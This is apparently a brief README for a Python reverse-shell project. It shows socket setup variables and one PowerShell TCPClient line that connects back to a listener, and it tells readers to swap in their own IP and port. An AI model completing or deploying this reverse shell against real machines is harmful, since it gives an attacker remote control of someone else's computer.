# Python-reverse-shell
Using sockets in python, you can connect to another computers powershell.
<br/>
<br/>
Note: Do remember to change the IP's and ports to your preferred IP's and Ports.
<br/>
`
import socket
`
<br/>
`
ip_adress = '127.0.0.1'     
`
<br/>
`
port_number = 1234      
`


You need to match the same Ip and port in the powershell code in
<br/>
`
$client = New-Object System.Net.Sockets.TCPClient('127.0.0.1',1234);
`
